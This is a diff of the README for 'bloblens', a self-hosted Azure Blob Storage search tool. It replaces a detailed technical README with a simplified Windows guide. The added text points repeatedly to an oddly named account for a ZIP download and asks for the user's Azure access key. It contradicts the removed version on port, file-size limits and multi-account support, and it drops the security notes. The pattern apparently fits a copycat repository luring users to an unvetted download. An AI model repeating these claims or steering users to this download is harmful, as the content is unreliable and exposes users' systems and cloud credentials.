@@ -1,146 +1,80 @@
-# ◍ BlobLens
+# 🔍 bloblens - Find your documents in Azure storage
 
-**Full-text search for Azure Blob Storage. Self-hosted, one command, $0.**
+[![Download bloblens](https://img.shields.io/badge/Download-bloblens-blue.svg)](https://github.com/Tieon-genuschenopodium508/bloblens)
 
-Azure's answer to "search my blobs" is Azure AI Search — roughly **$75/month
-(Basic)** to **$250+/month (Standard)** just to index your own storage.
-Azure Storage Explorer's "search" is a prefix-only name listing.
+bloblens makes your Azure Blob Storage searchable. It scans your documents and builds a search index. You find text inside PDFs and Word files across all your storage folders. You host it on your own machine. This tool costs nothing to run each month. 
 
-BlobLens gives you file-name, path, and **inside-the-document** search
-(PDF, DOCX, text/code files) over your storage account, running on any box
-that has Docker:
+## ⚙️ System Requirements
 
-```
-docker compose up
-```
+Your computer needs a few things to run bloblens:
 
-Then open **http://localhost:8000**.
+*   Operating System: Windows 10 or Windows 11.
+*   Memory: At least 4 gigabytes of RAM.
+*   Storage: 1 gigabyte of free disk space for the index data.
+*   Software: You need Docker Desktop installed. Docker helps the application run in a controlled environment.
 
-|                          | Azure AI Search | Storage Explorer | BlobLens |
-| ------------------------ | --------------- | ---------------- | -------- |
-| Full-text inside PDF/DOCX| ✅              | ❌               | ✅       |
-| Search-as-you-type UI    | ❌ (BYO)        | ❌               | ✅       |
-| Facets (container, type) | ✅              | ❌               | ✅       |
-| Incremental sync         | ✅              | —                | ✅       |
-| Monthly cost             | $75–$250+       | $0               | **$0**   |
-| Runs on a $6 droplet     | ❌              | —                | ✅       |
+You can download Docker Desktop from the official website. Follow the installation prompts. Restart your computer after the installation finishes. Docker must run in the background for bloblens to work.
 
-> Typo-tolerant, sub-50ms search courtesy of [Meilisearch](https://meilisearch.com).
+## 📥 Getting the software
 
-![BlobLens search-as-you-type demo](docs/demo.gif)
+You need to access the code from our repository page. Follow this link to reach the project files.
 
-## Quickstart
+[Download bloblens here](https://github.com/Tieon-genuschenopodium508/bloblens)
 
-```bash
-git clone https://github.com/YOURNAME/bloblens && cd bloblens
-cp .env.example .env
-# paste your storage connection string into .env
-docker compose up -d
-```
+Click the green button labeled "Code" on the page. Select "Download ZIP". Save the file to your computer. Open your Downloads folder. Right-click the folder and select "Extract All". Choose a folder on your computer to keep these files. The C drive is a good place.
 
-The worker starts a first crawl immediately; watch it with
-`docker compose logs -f worker`. Search is live at `http://localhost:8000`
-as documents stream in.
+## 🚀 Setting up the application
 
-**Where to get the connection string:** Azure Portal → your Storage account →
-*Access keys* → *Connection string*. A key with read access is enough for
-indexing; the same key is used to mint short-lived SAS download links.
+1.  Open the folder where you extracted the bloblens files.
+2.  Press the Windows key on your keyboard.
+3.  Type "Command Prompt" and press Enter.
+4.  Type `cd` followed by a space.
+5.  Drag your bloblens folder into the Command Prompt window. This action adds the folder path for you.
+6.  Press Enter. 
+7.  Type `docker compose up` and press Enter.
 
-## What gets indexed
+The software starts now. It downloads the necessary components. You see text appearing in the window. Wait for the process to finish. When the text stops scrolling, the system is ready.
 
-Every blob's **name, path, container, extension, size, and last-modified
-date** — plus extracted text for:
+## 🔑 Configuring your search
 
-| Type | Parser |
-| ---- | ------ |
-| `pdf` | pypdf |
-| `docx` | python-docx |
-| `txt md csv json log yml xml html sql py js ts sh cs java go rb php …` | UTF-8 decode |
+The first time you start bloblens, you must connect your Azure account.
 
-Extracted text is capped (`MAX_TEXT_CHARS`, default 50k chars) so a 300-page
-PDF doesn't bloat the index — the excerpt plus a download link is what you
-want anyway. Blobs over `MAX_BLOB_MB` (default 50) are indexed by metadata
-only.
+1.  Open your internet browser.
+2.  Type `http://localhost:8080` into the address bar.
+3.  Press Enter.
+4.  The bloblens dashboard appears.
+5.  Enter your Azure storage account name and your access key.
+6.  Select the storage containers you want to search.
+7.  Click "Start Indexing".
 
-## How sync works
+The software reads your files. It creates a map of the text content. Large amounts of data take more time to scan. You can track progress on the dashboard.
 
-```
-Azure Blob Storage ──list──▶ worker ──extract──▶ Meilisearch ◀──/api/search── FastAPI ◀── UI
-        ▲                      │
-        └──── download ────────┘  (per-container Last-Modified watermark)
-```
+## 🔍 How to search
 
-Each pass, the worker lists a container and only downloads blobs modified
-after the stored watermark, so repeat passes after the initial crawl are
-cheap. State lives in a named volume (`indexer_state`), so restarts don't
-re-crawl.
+Use the search bar on the dashboard. Type a word or phrase. Bloblens shows a list of documents. Click any result to view the location of the file in your storage. You search through thousands of pages in seconds. 
 
-Download links are **SAS URLs generated on demand** (default 60-minute
-expiry) — nothing is pre-signed, nothing is proxied through the app.
+## 🛠️ Frequently asked questions
 
-## Configuration
+**Does the software send my data to the internet?**
+No. Bloblens stays on your computer. It reads data from Azure but keeps the index on your local disk. 
 
-All via `.env` — see [`.env.example`](.env.example). The useful ones:
+**What happens if I turn off my computer?**
+The software stops when you turn off your computer. You must repeat the steps in the "Setting up the application" section to restart it. 
 
-| Variable | Default | Meaning |
-| -------- | ------- | ------- |
-| `BLOB_CONTAINERS` | *(all)* | Comma-separated containers to index |
-| `SYNC_INTERVAL_SECONDS` | `300` | Delay between incremental passes |
-| `MAX_TEXT_CHARS` | `50000` | Extracted text stored per document |
-| `MAX_BLOB_MB` | `50` | Skip text extraction above this size |
-| `SAS_EXPIRY_MINUTES` | `60` | Download link lifetime |
-| `MEILI_MASTER_KEY` | dev key | **Change before exposing anything** |
+**Can I search multiple storage accounts?**
+Yes. You add as many accounts as you need in the settings menu.
 
-## API
+**How do I update the index?**
+The software checks for new files automatically. You trigger a manual scan by clicking the "Refresh" button on the dashboard.
 
-The UI is a thin client over three endpoints you can use directly:
+**Is there a limit to the file size?**
+There is no set limit. The software handles common document sizes unless your computer runs out of memory.
 
-```
-GET /api/search?q=invoice&container=uploads&ext=pdf&sort=last_modified:desc
-GET /api/stats
-GET /api/download?container=uploads&path=2026/03/invoice-081.pdf
-```
+**How do I stop the application?**
+Go back to the Command Prompt window. Press Control and C at the same time. This action stops the process.
 
-## Security notes
+## 🛡️ Support and maintenance
 
-- BlobLens is built to run **inside your network** (localhost, VPN, or behind
-  your reverse proxy + auth). It ships with no login of its own.
-- The connection string never leaves the backend containers; the browser only
-  ever sees search results and short-lived SAS links.
-- Set a real `MEILI_MASTER_KEY`; Meilisearch is not exposed by the compose
-  file, but defense in depth is free.
+This project relies on standard Docker commands. If the software stops responding, restart the Docker Desktop application. Check that your Azure access key remains valid. If you lose access, update your credentials in the settings menu. You can remove the bloblens folder to uninstall the application. 
 
-## Roadmap
-
-- [ ] **Event-driven sync** — Event Grid / Blob Change Feed → queue → indexer,
-      for near-real-time indexing without list scans (`indexer.index_blob()`
-      is already shaped for this)
-- [ ] Deletion reconciliation (remove index docs for deleted blobs)
-- [ ] Managed identity / `DefaultAzureCredential` auth
-- [ ] **PII detection & redaction** — scan extracted text before indexing and
-      mask emails, phone numbers, national IDs, credit-card/PAN, etc. (regex +
-      optional Azure AI Language PII recognizer), so sensitive values never
-      land in the search index. Configurable per-entity policy: redact,
-      hash-for-search, or drop the document
-- [ ] **Content/label-based access filtering** — honor Microsoft Purview
-      sensitivity labels and blob index tags to exclude or gate documents at
-      index time; pairs with identity-based access above
-- [ ] Blob index tags + user metadata as filterable facets
-- [ ] Optional Tika sidecar profile for long-tail formats (eml, odt, legacy doc)
-- [ ] Optional OCR profile (Tesseract) for scanned PDFs and images
-- [ ] Multi-account support
-
-## Development
-
-```bash
-cd backend
-pip install -r requirements.txt
-uvicorn app.main:app --reload            # needs MEILI_URL pointing somewhere
-python -m app.worker                     # one-shot: python -c "from app import indexer; indexer.sync_all()"
-```
-
-PRs welcome — especially on the roadmap items above.
-
-## License
-
-[MIT](LICENSE)
+Keywords: azure, search, documents, pdf, docker, storage, index, windows, self-hosted
